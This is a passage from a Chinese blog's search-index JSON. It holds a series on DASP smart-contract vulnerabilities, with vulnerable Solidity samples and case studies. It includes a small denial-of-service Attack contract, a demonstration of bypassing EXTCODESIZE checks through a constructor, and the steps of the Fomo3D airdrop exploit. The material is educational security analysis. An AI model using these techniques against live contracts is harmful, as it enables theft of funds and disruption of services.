","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:24:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["区块链"],"content":"区块链安全云词 爬虫：scrapy 数据库：postgresql 分词：jieba 词频：py脚本（注意数据清洗) 云词：wordart 字体：Aa荷包鼓鼓 ","date":"2018-08-23","objectID":"/posts/blockchain-wordcloud.html:0:0","tags":["BlockChain"],"title":"Blockchain WordCloud","uri":"/posts/blockchain-wordcloud.html"},{"categories":["区块链"],"content":"0x00 Info 短地址攻击是DASP TOP10中详细描述的最后一类漏洞。这个漏洞其实可以归结于过去EVM的缺陷。 ","date":"2018-08-20","objectID":"/posts/dasp-short-addresses-9.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Short Addresses (9)","uri":"/posts/dasp-short-addresses-9.html"},{"categories":["区块链"],"content":"0x01 基础知识 Quote The Contract Application Binary Interface (ABI) is the standard way to interact with contracts in the Ethereum ecosystem, both from outside the blockchain and for contract-to-contract interaction. 在EVM虚拟机中合约是通过ABI接口进行交互，数据和方法都根据特定标准进行编解码。具体参见Contract ABI Specification。 如何通过ABI调用合约方法？方法和数据如何编码？我们举例（经典Token合约）来说明： contract MyToken { mapping (address =\u003e uint) balances; event Transfer(address indexed _from, address indexed _to, uint256 _value); function MyToken() { balances[tx.origin] = 10000; } function sendCoin(address to, uint amount) returns(bool sufficient) { if (balances[msg.sender] \u003c amount) return false; balances[msg.sender] -= amount; balances[to] += amount; Transfer(msg.sender, to, amount); return true; } function getBalance(address addr) constant returns(uint) { return balances[addr]; } } 如果我们想转币到其他地址，会外部调用sendCoin()方法，则创建交易后查看input数据如下： 展开为： 0x90b98a11 方法签名的hash值，4个字节，通过Keccak(sendCoin(address, uint))计算得到 00000000000000000000000062bec9abe373123b9b635b75608f94eb8644163e ‘to’地址，20个字节，填充前导0（12字节）至32字节 0000000000000000000000000000000000000000000000000000000000000002 ‘amount’数量，1字节无符号整型，填充前导0（31字节）至32字节 input就是一笔完整的交易数据。 ","date":"2018-08-20","objectID":"/posts/dasp-short-addresses-9.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Short Addresses (9)","uri":"/posts/dasp-short-addresses-9.html"},{"categories":["区块链"],"content":"0x02 攻击利用 17年Golem团队发现一笔可疑的GNT交易，从而发现了短地址漏洞。How to Find $10M Just by Reading the Blockchain一文中详细描述了漏洞的发现和利用。 我们还是以上面的例子分析下漏洞成因。 Question EVM和合约如果未校验用户输入会产生什么效果？ 我们把’to’地址的32字节最后1字节去掉，变成0x62bec9abe373123b9b635b75608f94eb864416，那此时input数据就会变成： 0x90b98a11 00000000000000000000000062bec9abe373123b9b635b75608f94eb86441600 00000000000000000000000000000000000000000000000000000000000002 第一个参数不足32字节会从第二参数高位取0补位，这样第二个参数就被左移1字节，相当于amount * 256。 交易瞬间变成了: from: '0x8b349f26a49a45776a1ec0d0188e7a89367c8c5d', to: '0x62bec9abe373123b9b635b75608f94eb86441600', value: 512, 该漏洞能够成功利用的大前提是： 币充足 在构成input数据时用户的输入和填充没有进行校验（在remix中实验失败就是因为已经不允许传入非法短地址了） ","date":"2018-08-20","objectID":"/posts/dasp-short-addresses-9.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Short Addresses (9)","uri":"/posts/dasp-short-addresses-9.html"},{"categories":["区块链"],"content":"0x00 Info 如果攻击者拥有矿工角色，在交易打包成块时，矿工在一定范围是可以操作块的时间戳的，而恰恰合约利用时间戳生成逻辑（特别是涉及到资金交易）就会存在Time manipulation风险。 ","date":"2018-08-19","objectID":"/posts/dasp-time-manipulation-8.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Time Manipulation (8)","uri":"/posts/dasp-time-manipulation-8.html"},{"categories":["区块链"],"content":"0x01 Rules 一个合约需要用到“当前时间”，通常是通过block.timestamp或者now来实现，而这个值来源于矿工！矿工是可以在几秒内调整这个时间戳的，从而为自己的利益改变合同的输出。 例如一个合约使用时间戳来生成随机数（在example中有实例），矿工可以在区块被验证后30s内发布时间戳，从而利用这30s的时间增加自己获利概率。 30-second Rule 矿工可以改变区块的时间戳 仅限于被验证后的30s 当前块的时间戳不能小于前一块的时间戳 但是一个合约具备以下特性，是可以安全使用时间戳的： Quote If the smart contract function can tolerate a 30-second time period, it’s safe to use timestamp; If the scale of a time-dependent event can vary by 30 seconds and maintain integrity, it’s also safe to use a block timestamp. ","date":"2018-08-19","objectID":"/posts/dasp-time-manipulation-8.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Time Manipulation (8)","uri":"/posts/dasp-time-manipulation-8.html"},{"categories":["区块链"],"content":"0x02 Examples 前两个实例合约主要利用block.timestamp来生成随机数，而在#DASP# Bad Randomness一文中我们详细介绍了这种随机数生成的缺陷。 ","date":"2018-08-19","objectID":"/posts/dasp-time-manipulation-8.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Time Manipulation (8)","uri":"/posts/dasp-time-manipulation-8.html"},{"categories":["区块链"],"content":"theRun Source Code uint256 constant private salt = block.timestamp; function random(uint Max) constant private returns (uint256 result){ //get the best seed for randomness uint256 x = salt * 100/Max; uint256 y = salt * block.number/(salt % 5) ; uint256 seed = block.number/3 + (salt % 300) + Last_Payout + y; uint256 h = uint256(block.blockhash(seed)); return uint256((h / x)) % Max + 1; //random number between 1 and Max } theRun合约使用block.timestamp作为随机数种子，而矿工完全可以在30s内计算一个利于获胜的随机数。 ","date":"2018-08-19","objectID":"/posts/dasp-time-manipulation-8.html:3:1","tags":["BlockChain","DASP"],"title":"#DASP# Time Manipulation (8)","uri":"/posts/dasp-time-manipulation-8.html"},{"categories":["区块链"],"content":"EtherLotto Source Code // Compute some *almost random* value for selecting winner from current transaction. var random = uint(sha3(block.timestamp)) % 2; EtherLotto合约随机数的计算就更简单粗暴了，直接使用block.timestamp做hash。 ","date":"2018-08-19","objectID":"/posts/dasp-time-manipulation-8.html:3:2","tags":["BlockChain","DASP"],"title":"#DASP# Time Manipulation (8)","uri":"/posts/dasp-time-manipulation-8.html"},{"categories":["区块链"],"content":"Governmental Source Code 在#DASP# Denial of Services开篇中我们介绍过Governmental合约，其存在重置超长creditor列表时gas溢出导致的DOS问题（未检查send返回值）。 如果攻击者同时拥有矿工身份，那该合约同样存在时间戳篡改风险。 游戏的规则玩法我们再简单介绍下，政府在最近12小时内没有收到任何投资人捐赠，则将奖金发给最后一名投资人。 恶意的矿工用修改后的时间戳为他的交易生成了一个块，从而延迟了他的交易成为最后的交易，这样他就从合约中赢得了资金。 在A survey of attacks on Ethereum smart contracts一文中介绍了Governmental合约的三个攻击方式。 ","date":"2018-08-19","objectID":"/posts/dasp-time-manipulation-8.html:3:3","tags":["BlockChain","DASP"],"title":"#DASP# Time Manipulation (8)","uri":"/posts/dasp-time-manipulation-8.html"},{"categories":["区块链"],"content":"0x00 Info 本篇介绍DASP第七种漏洞类型–前置执行。 可以理解为因为区块链是公开，其他用户或者合约的交易信息均透明可查，恶意用户可以利用这些已知信息制造有利于自己的交易，并通过提高手续费的方式抢先执行获利。 当然，在front-running-griefing-and-the-perils-of-virtual-settlement中描述，如果这个恶意用户本身又是矿工，可以任意安排交易并审查其他人交易，使自己利益最大化。 ","date":"2018-08-16","objectID":"/posts/dasp-front-running-7.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Front Running (7)","uri":"/posts/dasp-front-running-7.html"},{"categories":["区块链"],"content":"0x01 实例 ","date":"2018-08-16","objectID":"/posts/dasp-front-running-7.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Front Running (7)","uri":"/posts/dasp-front-running-7.html"},{"categories":["区块链"],"content":"LastIsMe Contract Source Code LastIsMe是一个lottery游戏合约，在一个游戏回合（一定的区块数内）参与者购买一张票认领最后一个座位，回合结束时最后一个就坐的玩家会获得头奖。 攻击者可以在回合快结束时观察其他玩家的交易池，通过提高gas来挤掉其他玩家的交易从而获得奖金。 ","date":"2018-08-16","objectID":"/posts/dasp-front-running-7.html:2:1","tags":["BlockChain","DASP"],"title":"#DASP# Front Running (7)","uri":"/posts/dasp-front-running-7.html"},{"categories":["区块链"],"content":"ICO Contract Source Code ICO本身是一道CTF题，它包含一个DAPP网站和与其交互的两个合约（HaCoin \u0026 ICO），部署在rinkeby测试链上。 HaCoin是一个Token合约，比赛的目标也是从该合约中获取超过31337枚HackCoin，而这个合约本身并没有问题，需要配合Web网站存在的XSS漏洞来提权，才能进行转币操作。很有意思，具体writeup参见ZeroNights ICO Hacking Contest Writeup。 而另一个合约ICO是一个lottery合约，游戏规则也很简单，5个块为一回合，回合内参与者猜一个数字，回合结束时机器人会随机抛出一个数字，如果谁猜中谁就获胜。而该合约存在前置执行漏洞。 function spinLottery(uint number) public { if (msg.sender != robotAddress) { playerNumber[msg.sender] = number; players.push(msg.sender); NewLotteryBet(msg.sender); } else { require(block.number - lotteryBlock \u003e 5); lotteryBlock = block.number; for (uint i = 0; i \u003c players.length; i++) { if (playerNumber[players[i]] == number) { desires[players[i]].active = true; desires[players[i]].email = \"*Use changeEmail func to set your email.*\"; Proposal(players[i], desires[players[i]].email); } } delete players; // flushing round NewLotteryRound(lotteryBlock); } } 机器人发布的随机数明文提交到交易池，如果攻击者能够足够快的检索pending交易并找到该随机数，然后使用该随机数参与游戏，保证两笔交易在同一个块中，并提高gas在机器人发布随机数的交易之前执行，就能获胜。 ","date":"2018-08-16","objectID":"/posts/dasp-front-running-7.html:2:2","tags":["BlockChain","DASP"],"title":"#DASP# Front Running (7)","uri":"/posts/dasp-front-running-7.html"},{"categories":["区块链"],"content":"BancorFormula Contract Source Code 详细分析：Implementing Ethereum trading front-runs on the Bancor exchange in Python ","date":"2018-08-16","objectID":"/posts/dasp-front-running-7.html:2:3","tags":["BlockChain","DASP"],"title":"#DASP# Front Running (7)","uri":"/posts/dasp-front-running-7.html"},{"categories":["区块链"],"content":"0x00 Info 绝对的随机在Ethereum中很难实现，因为所有参数都可以在透明的链上查询，因此想要利用随机特性生成逻辑很容易出现bug，本篇就介绍DASP中第六类漏洞–不安全的随机性。 ","date":"2018-08-09","objectID":"/posts/dasp-bad-randomness-6.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Bad Randomness (6)","uri":"/posts/dasp-bad-randomness-6.html"},{"categories":["区块链"],"content":"0x01 错误实践 Solidity本身提供一些获取“随机值”的方法和变量，你可以在官方文档中查看。但是这些“随机值”（在链上公开）如果不当的作为生成随机数的因子或种子，那随机数就可以被预测。 根据DASP提供的实例我们看看有哪些坑。 第一种 uint256 private seed; function play() public payable { require(msg.value \u003e= 1 ether); iteration++; uint randomNumber = uint(keccak256(seed + iteration)); if (randomNumber % 2 == 0) { msg.sender.transfer(this.balance); } } 利用私有变量seed和iteration通过keccak256 hash计算得到随机数，虽然seed属性为private，但是它也要在某个时间点设置，可以通过链上相关tx来获取其值，因此随机性可预测。 第二种 function play() public payable { require(msg.value \u003e= 1 ether); if (block.blockhash(blockNumber) % 2 == 0) { msg.sender.transfer(this.balance); } } 这里使用block.blockhash(blockNumber)来计算随机数，这里必须强调的是，在solidity中，block.blockhash(uint blockNumber) returns (bytes32)只计算就近的256个块hash，如果blockNumber为当前块（block.number）或者超过256更久远的块，计算结果都是0. Quote block.blockhash(uint blockNumber) returns (bytes32): hash of the given block - only works for 256 most recent blocks excluding current The block hashes are not available for all blocks for scalability reasons. You can only access the hashes of the most recent 256 blocks, all other values will be zero. 同时Solidity文档也强调尽量不要使用block.timestamp、now和block.blockhash计算随机数。 Quote Do not rely on block.timestamp, now and block.blockhash as a source of randomness, unless you know what you are doing. Both the timestamp and the block hash can be influenced by miners to some degree. Bad actors in the mining community can for example run a casino payout function on a chosen hash and just retry a different hash if they did not receive any money. block.timestamp (uint): current block timestamp as seconds since unix epoch now (uint): current block timestamp (alias for block.timestamp) block.blockhash(uint blockNumber) returns (bytes32): hash of the given block - only works for 256 most recent blocks excluding current ","date":"2018-08-09","objectID":"/posts/dasp-bad-randomness-6.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Bad Randomness (6)","uri":"/posts/dasp-bad-randomness-6.html"},{"categories":["区块链"],"content":"0x02 案例 我们先来看两个DASP提供的真实案例。 ","date":"2018-08-09","objectID":"/posts/dasp-bad-randomness-6.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Bad Randomness (6)","uri":"/posts/dasp-bad-randomness-6.html"},{"categories":["区块链"],"content":"SmartBillions 披露：SmartBillions lottery contract just got hacked! SmartBillions是一个赌博合约（Contract Source Code），本身是一个ICO项目。玩法是下注6位数，每位范围0-15，猜中2位以上会获得相应奖励。根据论坛作者supr3m的披露，该合约本身存在随机数漏洞，黑客利用触发2次漏洞取走合约中400ETH，在后续要利用漏洞全部取走资金时，ICO利用后门函数冻结资金防止资金被盗。这个后门函数也被作者吐槽，怀疑ICO会利用后门集资卷款跑路。 我们先看下黑客利用合约漏洞做的tx 合约执行标签可以看到两笔200ETH的操作 在4337369块，合约0x5ace17f87c7391e5792a7683069a8025b83bbd85向0x6245c1804F7fCEB305A60BBb5cb6E18F939EDB69账户地址转200ETH，我们看下该地址的TX 黑客首先在4337096块调用合约playSystem(uint _hash, address _partner)函数，第一个参数000001为下注的6位数 然后再超过256块后的4337369块调用合约won()函数，赢得200ETH的二等奖金（猜中前5个下注数） 在第二步的蓝框中黑客还想继续利用同样手法赢得一等奖金（6个下注数全中） 根据论坛作者描述和黑客操作，审计合约后，发现漏洞是在playSystem()中的won()函数中，根据player.blockNum的hash和下注的数字做比对，而这种hash在超过256个块后结果为0，因此黑客押的000001和hash结果000000前5位一致而得到二等奖。 ","date":"2018-08-09","objectID":"/posts/dasp-bad-randomness-6.html:3:1","tags":["BlockChain","DASP"],"title":"#DASP# Bad Randomness (6)","uri":"/posts/dasp-bad-randomness-6.html"},{"categories":["区块链"],"content":"theRun #timestamp dependence bug Contract Source Code 合约中利用random(unit Max)函数进行随机数生成，而生成因子主要是利用block.timestamp和block.number，而时间戳可以由矿工操控，故矿工可以选择有利的随机数来提高获取奖励的概率。 function Participate(uint deposit) private { ... // Winning the Pot :) Condition : paying at least 1 people with deposit \u003e 2 ether and having luck ! if( ( deposit \u003e 1 ether ) \u0026\u0026 (deposit \u003e players[Payout_id].payout) ){ uint roll = random(100); //take a random number between 1 \u0026 100 if( roll % 10 == 0 ){ //if lucky : Chances : 1 out of 10 ! msg.sender.send(WinningPot); // Bravo ! WinningPot=0; } } ... } uint256 constant private salt = block.timestamp; function random(uint Max) constant private returns (uint256 result){ //get the best seed for randomness uint256 x = salt * 100 / Max; uint256 y = salt * block.number / (salt % 5) ; uint256 seed = block.number/3 + (salt % 300) + Last_Payout +y; uint256 h = uint256(block.blockhash(seed)); return uint256((h / x)) % Max + 1; //random number between 1 and Max } 接着我们研究下受随机数漏洞影响的当下最火游戏合约Fomo3D。 ","date":"2018-08-09","objectID":"/posts/dasp-bad-randomness-6.html:3:2","tags":["BlockChain","DASP"],"title":"#DASP# Bad Randomness (6)","uri":"/posts/dasp-bad-randomness-6.html"},{"categories":["区块链"],"content":"Fomo3D 这是一个叫JUST的团队开发的以太坊游戏，just在英文中有“公正、正义”的意思，然而游戏从UI界面到游戏说明充满了恶搞和对人性贪婪的讽刺，比如推荐链接在游戏中就叫“坏建议”，开发团队并不避讳这是一个乐透game，声称这是一次大型社会学实验。 这个游戏本身就是一个庞氏骗局，各位看官三思而后入！ 游戏官网 游戏玩法介绍 FoMo3Dlong Source Code 而漏洞发现的起因也非常有趣，Fomo3D游戏的开发者在twitter上@V神，说发现一个EVM上核弹级漏洞，结果被Ethereum团队leader回怼，并且顺手找了一个Fomo3D游戏漏洞^_^ 故事经过在文章Pwning Fomo3D Revealed: Iterative, Pre-Calculated Contract Creation For Airdrop Prizes!中有介绍，并且描述了Fomo3D漏洞。 根据文章描述Fomo3D存在两个漏洞导致被薅羊毛。 第一个漏洞–错误的访问控制检查： modifier isHuman() { address _addr = msg.sender; uint256 _codeLength; assembly {_codeLength := extcodesize(_addr)} require(_codeLength == 0, \"sorry humans only\"); _; } FoMo3Dlong合约使用isHuman()函数判断调用者是一个外部账户还是一个合约地址，核心利用assembly {_codeLength := extcodesize(_addr)}判断，其中关键函数extcodesize(a)代表a地址上的代码大小，如果等于0，则代表一个外部账户，非0则代表合约地址，本身很好理解。 但这样判断有个风险，在Mechanism Design Security in Smart Contracts一文中提到： Quote NOTE: Do not use the EXTCODESIZE check to prevent smart contracts from calling a function. This is not foolproof, it can be subverted by a constructor call, due to the fact that while the constructor is running, EXTCODESIZE for that address returns 0. 例：合约A中有函数funA使用如上的访问控制，当你在一个合约B的构造函数（constructor()）中调用合约A中的funA，可绕过访问控制成功调用，尽管B是一个合约。extcodesize(B_addr) return 0. 我们可以通过remix验证这一点： 合约A，主要功能是判断调用者是外部账户(返回false)还是合约账户(返回true)： contract A { function isContract() public returns (bool isContract){ uint32 size; address _addr = msg.sender; assembly { size := extcodesize(_addr) } return (size \u003e 0); } } 发布合约A并将合约A地址写入合约B，合约B分别在构造函数内外去调用合约A的isContract()函数，通过log查看返回值： interface demoInterface { function isContract() external returns (bool); } contract B { event LogConstructor(bool); event Logb(bool); constructor() public { demoInterface demo= demoInterface(0xdc544654fefd1a458eb24064a6c958b14e579154); emit LogConstructor(demo.isContract()); } function b() public { demoInterface demo= demoInterface(0xdc544654fefd1a458eb24064a6c958b14e579154); emit Logb(demo.isContract()); } } 发布合约B并且调用方法b，对比下log中打印的返回值 可以看到在构造函数中调用其他合约受控（extcodesize()）的方法可以绕过访问控制。 第二个漏洞–可预测的随机数： Fomo3D中你在花钱买key的时候会有一定几率获得空投。 function airdrop() private view returns(bool) { uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number) ))); if((seed - ((seed / 1000) * 1000)) \u003c airDropTracker_) return(true); else return(false); } 可以看到随机数种子seed的计算是由当前块的信息加上msg.sender构成，而攻击者可以在合适的时间计算得到小于airDropTracker_的seed，从而保证100%获取空投奖励。 文章描述攻击步骤可以总结为： Pre-calculate the address X of the next contract that the attacker address is about to create; If X can’t be used to generate a good seed with the current airDropTracker_, goto step 1; Create contract at address X; Invoke buyXid() function from X to win the airdrop prize; Invoke withdraw() function from X to get earnings calculated by the airdrop prize; 这里还有个知识点是如何计算以太坊合约地址，读者可以去主动学习。 How to PWN FoMo3D, a beginners guide 同样提供了漏洞分析及exp利用。 ","date":"2018-08-09","objectID":"/posts/dasp-bad-randomness-6.html:3:3","tags":["BlockChain","DASP"],"title":"#DASP# Bad Randomness (6)","uri":"/posts/dasp-bad-randomness-6.html"},{"categories":["区块链"],"content":"0x03 最佳实践 在Predicting Random Numbers in Ethereum Smart Contracts一文中，调研3k+合约发现43个合约存在随机数可被预测的问题，其主要由4类漏洞产生： PRNGs using block variables as a source of entropy PRNGs based on a blockhash of some past block PRNGs based on a blockhash of a past block combined with a seed deemed private PRNGs prone to front-running（后续文章会讲到） 同时也描述了如何实现更安全随机数的3中方法： External oracles Signidice Commit–reveal approach ","date":"2018-08-09","objectID":"/posts/dasp-bad-randomness-6.html:4:0","tags":["BlockChain","DASP"],"title":"#DASP# Bad Randomness (6)","uri":"/posts/dasp-bad-randomness-6.html"},{"categories":["区块链"],"content":"0x00 Info 在智能合约中，当 超过gas限制，异常抛出，非预期的终止合约，访问控制被破坏 均会产生合约拒绝服务问题。 本篇就介绍DASP第五大漏洞–Denial of Service ","date":"2018-08-09","objectID":"/posts/dasp-denial-of-services-5.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Denial of Services (5)","uri":"/posts/dasp-denial-of-services-5.html"},{"categories":["区块链"],"content":"0x01 Real World Impact ","date":"2018-08-09","objectID":"/posts/dasp-denial-of-services-5.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Denial of Services (5)","uri":"/posts/dasp-denial-of-services-5.html"},{"categories":["区块链"],"content":"GovernMental 起因：GovernMental’s 1100 ETH jackpot payout is stuck because it uses too much gas 官网：GovernMental 源码：etherscan code GovernMental本身是个嘲讽政府庞氏骗局的游戏合约，其规则大概为投资者捐最少1ETH给政府，如果政府在最近12小时内没有收到任何捐赠，则将奖金发给最后一名投资人，而如果收到奖励，则按一定比例分别将钱分给资金池、政府及投资人。 其中在大于12小时未收到赞助的逻辑分支中，将奖金分给最后一名投资人后会重置所有投资人： if (lastTimeOfNewCredit + TWELVE_HOURS \u003c block.timestamp) { // Return money to sender msg.sender.send(amount); // Sends all contract money to the last creditor creditorAddresses[creditorAddresses.length - 1].send(profitFromCrash); corruptElite.send(this.balance); // Reset contract state lastCreditorPayedOut = 0; lastTimeOfNewCredit = block.timestamp; profitFromCrash = 0; creditorAddresses = new address[](0); // out of gas! creditorAmounts = new uint[](0); // out of gas! round += 1; return false; } 以上标注out of gas的两行在底层运行时，代码会循环遍历存储位置并逐个删除，如果creditors过多的话，会消耗大于当前最大gas数量导致合约失效。 Governmental Attack：简化版的Governmental及其EXP利用。 ","date":"2018-08-09","objectID":"/posts/dasp-denial-of-services-5.html:2:1","tags":["BlockChain","DASP"],"title":"#DASP# Denial of Services (5)","uri":"/posts/dasp-denial-of-services-5.html"},{"categories":["区块链"],"content":"Parity kill() Parity Multisig Hacked. Again A Postmortem on the Parity Multi-Sig Library Self-Destruct 这个其实在#DASP# Access Control (3)一篇中已经介绍，还是利用访问控制漏洞接管parity钱包，然后不是取钱还是调用合约中kill函数销毁合约，从而导致任意用户都无法继续使用。 // kills the contract sending everything to `_to`. function kill(address _to) onlymanyowners(sha3(msg.data)) external { suicide(_to); } ","date":"2018-08-09","objectID":"/posts/dasp-denial-of-services-5.html:2:2","tags":["BlockChain","DASP"],"title":"#DASP# Denial of Services (5)","uri":"/posts/dasp-denial-of-services-5.html"},{"categories":["区块链"],"content":"0x02 Example 实例来源于DASP，模仿King of the Ether游戏规则，当你向合约发送比现在price多的eth时，你就可以成为总统，之前的总统会收到当前price的补偿，且当前price翻倍。 而争夺者为一个合约且在fallback函数中恶意抛出异常，则可以破坏游戏规则永远成为总统。 contract PresidentOfCountry { address public president; uint256 public price; function PresidentOfCountry(uint256 _price) { require(_price \u003e 0); price = _price; president = msg.sender; } function becomePresident() payable { require(msg.value \u003e price); // must pay the price to become president president.transfer(price); // we pay the previous president president = msg.sender; // we crown the new president price = price * 2; // we double the price to become president } } contract Attack { function () { revert(); } function Attack(address _target) payable { _target.call.value(msg.value)(bytes4(keccak256(\"becomePresident()\"))); } } Attack合约部署后通过构造函数调用PresidentOfCountry合约的becomePresident()函数，同时发送大于price的eth，则执行becomePresident逻辑，1. 向之前的账户发送price补偿；2. 自己合约账户变为president；3. price翻倍。 当其他正常账户参与游戏调用becomePresident逻辑时，同样会向attach合约地址（当前president）发送price，正因为当前president不是普通账户还是合约账户，transfer会触发合约中fallback函数，而恶业攻击者在fallback中执行了revert()，导致异常，从而无法执行后续变更总统和价格的逻辑。造成合约DOS。 可以再remix中模拟上述操作。 ","date":"2018-08-09","objectID":"/posts/dasp-denial-of-services-5.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Denial of Services (5)","uri":"/posts/dasp-denial-of-services-5.html"},{"categories":["区块链"],"content":"0x03 Others 除了智能合约，链核心、链节点、区块链相关的网址都会出现DOS。 EOSIO EOSIO CVE-2018-11548 Bitcoin Core CVE-2016-10724 CVE-2016-10725 BitCoin Web 知名比特币网站bustabit价值$12,000的点击劫持、XSS以及拒绝服务漏洞详情揭秘 ","date":"2018-08-09","objectID":"/posts/dasp-denial-of-services-5.html:4:0","tags":["BlockChain","DASP"],"title":"#DASP# Denial of Services (5)","uri":"/posts/dasp-denial-of-services-5.html"},{"categories":["区块链"],"content":"0x00 Info Unchecked Return Values For Low Level Calls漏洞简单理解就是没有检查一些不安全调用函数的返回值导致。 ","date":"2018-08-03","objectID":"/posts/dasp-unchecked-return-valuse-4.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Unchecked Return Valuse (4)","uri":"/posts/dasp-unchecked-return-valuse-4.html"},{"categories":["区块链"],"content":"0x01 CALL -\u003e Contract 在reentrancy漏洞介绍中提到几种账户间转币函数，这里我们回顾并深入了解下： 函数 特性 address.transfer() 1. 失败抛出异常且回滚 2. 提供2300gas，防止reentrancy address.send() 1. 失败返回false 2. 提供2300gass，防止reentrancy address.call.value().gas()() 1. 失败返回false 2. 发送所有可用gas 在这些交易函数中需要注意的是： addr.transfer()和addr.send()能够防止重入漏洞。但是这些方法会触发fallback函数执行，被调合约仅被提供2300gas做一些日志事件。 x.transfer(y)等同于require(x.send(y))，transfer在发送失败时会自动revert（内置失败处理）。 addr.call.value(y)()也会触发代码执行，但是会用所有提供的gas执行代码，当然这种方式不能防止reentrancy漏洞。 通过了解以上我们会提出一些疑问： 2300gas由谁来提供？为何是2300gas? 2300gas能做什么？ 哪些行为会导致发送失败？ 要回答这些问题，首先要知道一个知识点，transfer、send、call在EVM虚拟机执行时会将这些solidity编译成 CALL 指令，而在以太坊wiki中定义了CALL的gas消耗： Quote CALL has a multi-part gas cost: 700 base 9000 additional if the value is nonzero 25000 additional if the destination account does not yet exist (note: there is a difference between zero-balance and nonexistent!) CALLCODE operates similarly to call, except without the potential for a 25000 gas surcharge. The child message of a nonzero-value CALL operation (NOT the top-level message arising from a transaction!) gains an additional 2300 gas on top of the gas supplied by the calling account; this stipend can be considered to be paid out of the 9000 mandatory additional fee for nonzero-value calls. This ensures that a call recipient will always have enough gas to log that it received funds. 从wiki中可以知道交易操作至少需要9700gas（700base+9000additional），而2300gas就在其中，由接收合约提供，确保有足够gas记录其接收的资金。2300gas属于硬编码津贴，规定就是这么多。这里即回答了第一个问题。 对于第二个问题哪些行为会导致发送失败，其实在wiki中也有说明。 Quote Execution running out of gas An operation trying to take more slots off the stack than are available on the stack, or put more than 1024 items onto the stack Jumping to a bad jump destination An invalid opcode (note: the code of an account is assumed to be followed by an infinite tail of STOP instructions, so the program counter “walking off” the end of the code is not an invalid opcode exception. However, jumping outside the code is an exception, because STOP is not a valid jump destination) The REVERT opcode at 0xfd (starting from Metropolis; pre-Metropolis 0xfd is simply an invalid opcode) 其中gas溢出和超过调用栈限制这两点导致的发送失败很容易被忽略，但这也恰恰是漏洞发生的地方。 ","date":"2018-08-03","objectID":"/posts/dasp-unchecked-return-valuse-4.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Unchecked Return Valuse (4)","uri":"/posts/dasp-unchecked-return-valuse-4.html"},{"categories":["区块链"],"content":"0x02 Unchecked Low Level Calls 正如DASP介绍，solidity特性中存在一些不安全的函数call()，callcode()(已经遗弃)，delegatecall()和send()。这个函数在运行错误时行为并不可逆，仅会返回false，代码流程也会继续，这就会带来很多不可预期的结果。 实例代码: function withdraw(uint256 _amount) public { require(balances[msg.sender] \u003e= _amount); balances[msg.sender] -= _amount; etherLeft -= _amount; msg.sender.send(_amount); } msg.sender为一个智能合约，其中未定义fallback函数，或者callstack已满，均会导致send失败，而函数未检出send返回值，最终导致msg.sender和etherLeft数量减少且状态不可逆转，最后却没有取回减少的钱。 ","date":"2018-08-03","objectID":"/posts/dasp-unchecked-return-valuse-4.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Unchecked Return Valuse (4)","uri":"/posts/dasp-unchecked-return-valuse-4.html"},{"categories":["区块链"],"content":"0x03 KotET contract KotET是一个抢皇位的游戏合约，合约代码见github 游戏规则和漏洞分析可以看Post-Mortem Investigation这篇文章。 // Claim the throne for the given name by paying the currentClaimFee. function claimThrone(string name) { ... uint compensation = valuePaid - wizardCommission; if (currentMonarch.etherAddress != wizardAddress) { currentMonarch.etherAddress.send(compensation); } else { // When the throne is vacant, the fee accumulates for the wizard. } ... } 其主要就是因为没有判断send函数返回值，导致在接受者是一个合约时，有可能因为gas不足而导致send失败（例如Mist钱包合约对于KotET提供的gas不足以处理支付行为），从而old king没有收到补偿，new king没有消耗资金变争夺了王位。 ","date":"2018-08-03","objectID":"/posts/dasp-unchecked-return-valuse-4.html:4:0","tags":["BlockChain","DASP"],"title":"#DASP# Unchecked Return Valuse (4)","uri":"/posts/dasp-unchecked-return-valuse-4.html"},{"categories":["区块链"],"content":"0x04 lotto contract issues contract source code exp function cash(uint roundIndex, uint subpotIndex){ ... var winner = calculateWinner(roundIndex,subpotIndex); var subpot = getSubpot(roundIndex); winner.send(subpot); rounds[roundIndex].isCashed[subpotIndex] = true; //Mark the round as cashed } 这里合约的漏洞比较简单，还是send没有判断返回值，导致在callstack超过1024时send失败，程序继续执行。 但是可以学习如何用pyethereum写exp。 Warning amiller所用的pyethereum与现在的版本已有很大区别，需要重新优化exp代码。 ","date":"2018-08-03","objectID":"/posts/dasp-unchecked-return-valuse-4.html:5:0","tags":["BlockChain","DASP"],"title":"#DASP# Unchecked Return Valuse (4)","uri":"/posts/dasp-unchecked-return-valuse-4.html"},{"categories":["区块链"],"content":"0x05 Others 其他合约也存在类似问题，例如BTC合约： Report: Security Audit of BTC Relay implementation [diff] Scanning Live Ethereum Contracts for the “Unchecked-Send” Bug一文中也详细描述了此类问题的并提供了修复和扫描工具原理–Appendix A: Details on how we analyze the blockchain。 利用sand函数在虚拟机字节码中连续POP数量来判断是否做返回值处理。 ","date":"2018-08-03","objectID":"/posts/dasp-unchecked-return-valuse-4.html:6:0","tags":["BlockChain","DASP"],"title":"#DASP# Unchecked Return Valuse (4)","uri":"/posts/dasp-unchecked-return-valuse-4.html"},{"categories":["区块链"],"content":"0x00 Info Arithmetic Issues为DASP 